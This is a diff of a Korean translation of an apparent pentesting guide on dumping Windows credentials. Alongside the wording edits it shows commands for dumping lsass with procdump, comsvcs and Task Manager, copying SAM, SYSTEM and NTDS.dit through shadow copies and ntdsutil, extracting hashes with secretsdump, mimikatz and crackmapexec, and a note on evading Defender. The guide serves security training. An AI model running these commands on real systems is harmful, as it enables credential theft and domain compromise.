@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Meterpreter를 통한 자격 증명
 
-희생자 내부에서 **비밀번호와 해시를 검색하기 위해** 제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하세요.
+내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 **희생자의 내부에서 비밀번호와 해시를 검색**하세요.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -49,14 +49,18 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-**SysInternals의 Procdump**는 **합법적인 Microsoft 도구**이므로 Defender에 의해 탐지되지 않습니다.\
+**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**는 합법적인 Microsoft 도구**이므로 Defender에 의해 탐지되지 않습니다.\
 이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드**하며 **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.
+
+또한 [SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -85,7 +89,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ### **작업 관리자를 사용하여 lsass 덤프하기**
 
 1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
-2. 더 많은 세부정보를 클릭합니다.
+2. 자세히 더 보기 클릭
 3. 프로세스 탭에서 "로컬 보안 권한 프로세스"를 검색합니다.
 4. "로컬 보안 권한 프로세스"를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 만들기"를 클릭합니다.
 
@@ -133,7 +137,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-이 파일은 **_C:\windows\system32\config\SAM_** 및 **_C:\windows\system32\config\SYSTEM._**에 **위치해야** 합니다. 그러나 **일반적인 방법으로 복사할 수는 없습니다**. 왜냐하면 이 파일들은 보호되어 있기 때문입니다.
+이 파일은 **_C:\windows\system32\config\SAM_** 및 **_C:\windows\system32\config\SYSTEM._**에 **위치해야** 합니다. 하지만 **일반적인 방법으로 복사할 수는 없습니다**. 왜냐하면 이 파일들은 보호되어 있기 때문입니다.
 
 ### From Registry
 
@@ -167,7 +171,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-하지만 **Powershell**을 사용하여 동일한 작업을 수행할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예입니다(사용되는 하드 드라이브는 "C:"이며 C:\users\Public에 저장됩니다). 그러나 이를 사용하여 보호된 파일을 복사할 수 있습니다:
+하지만 **Powershell**을 사용하여 동일한 작업을 수행할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예입니다(사용된 하드 드라이브는 "C:"이며 C:\users\Public에 저장됩니다). 그러나 이를 사용하여 보호된 파일을 복사할 수도 있습니다:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -184,17 +188,17 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory Credentials - NTDS.dit**
 
-**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 이곳은 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.
+**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 이곳은 도메인 사용자에 대한 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.
 
 이 데이터베이스 내에는 세 가지 주요 테이블이 유지됩니다:
 
 - **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
 - **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
-- **SD Table**: 각 객체에 대한 **보안 설명자**가 여기에 저장되어, 저장된 객체의 보안 및 접근 제어를 보장합니다.
+- **SD Table**: 각 객체에 대한 **보안 설명자**가 여기 저장되어, 저장된 객체에 대한 보안 및 접근 제어를 보장합니다.
 
 자세한 정보는 다음을 참조하세요: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호작용하며, _lsass.exe_에 의해 사용됩니다. 그러면 **NTDS.dit** 파일의 일부는 **`lsass`** 메모리 내에 위치할 수 있습니다(성능 향상을 위해 **캐시**를 사용하여 최근에 접근한 데이터를 찾을 수 있습니다).
+Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호작용하며, _lsass.exe_에 의해 사용됩니다. 그러면 **NTDS.dit** 파일의 **일부**는 **`lsass`** 메모리 내에 위치할 수 있습니다(성능 향상을 위해 **캐시**를 사용하여 최근에 접근한 데이터를 찾을 수 있습니다).
 
 #### NTDS.dit 내 해시 복호화
 
@@ -206,17 +210,17 @@ Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호작용하며, _lsa
 
 **PEK**는 **모든 도메인 컨트롤러**에서 **같은 값**을 가지지만, **도메인 컨트롤러의 SYSTEM 파일의 BOOTKEY**를 사용하여 **NTDS.dit** 파일 내에서 **암호화**됩니다(도메인 컨트롤러 간에 다름). 따라서 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit 및 SYSTEM 파일**이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).
 
-### Ntdsutil을 사용하여 NTDS.dit 복사하기
+### Ntdsutil을 사용한 NTDS.dit 복사
 
 Windows Server 2008부터 사용 가능합니다.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-당신은 또한 [**볼륨 섀도 복사**](#stealing-sam-and-system) 트릭을 사용하여 **ntds.dit** 파일을 복사할 수 있습니다. **SYSTEM 파일**의 복사본도 필요하다는 것을 기억하세요 (다시 말해, [**레지스트리에서 덤프하거나 볼륨 섀도 복사**](#stealing-sam-and-system) 트릭을 사용하세요).
+[**볼륨 섀도 복사**](#stealing-sam-and-system) 트릭을 사용하여 **ntds.dit** 파일을 복사할 수도 있습니다. **SYSTEM 파일**의 복사본도 필요하다는 점을 기억하세요 (다시 말해, [**레지스트리에서 덤프하거나 볼륨 섀도 복사**](#stealing-sam-and-system) 트릭을 사용하세요).
 
 ### **NTDS.dit에서 해시 추출하기**
 
-**NTDS.dit** 및 **SYSTEM** 파일을 **획득**한 후, _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
+**NTDS.dit**와 **SYSTEM** 파일을 **획득**한 후, _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
@@ -234,7 +238,7 @@ NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` 하이브는 선택 사항이지만 비밀 복호화를 허용합니다 (NT 및 LM 해시, 일반 텍스트 비밀번호, kerberos 또는 신뢰 키와 같은 보조 자격 증명, NT 및 LM 비밀번호 기록). 다른 정보와 함께 다음 데이터가 추출됩니다: 해시가 있는 사용자 및 머신 계정, UAC 플래그, 마지막 로그온 및 비밀번호 변경의 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰된 도메인...
+`SYSTEM` 하이브는 선택 사항이지만 비밀 복호화를 허용합니다 (NT 및 LM 해시, 일반 텍스트 비밀번호, kerberos 또는 신뢰 키와 같은 보조 자격 증명, NT 및 LM 비밀번호 기록). 다음 데이터가 추출됩니다: 해시가 있는 사용자 및 머신 계정, UAC 플래그, 마지막 로그인 및 비밀번호 변경의 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰된 도메인...
 
 ## Lazagne
 
@@ -242,11 +246,11 @@ ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
 lazagne.exe all
 ```
-## SAM 및 LSASS에서 자격 증명을 추출하기 위한 기타 도구
+## Other tools for extracting credentials from SAM and LSASS
 
 ### Windows credentials Editor (WCE)
 
-이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다운로드는 다음에서 가능합니다: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다운로드는 다음에서 할 수 있습니다: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
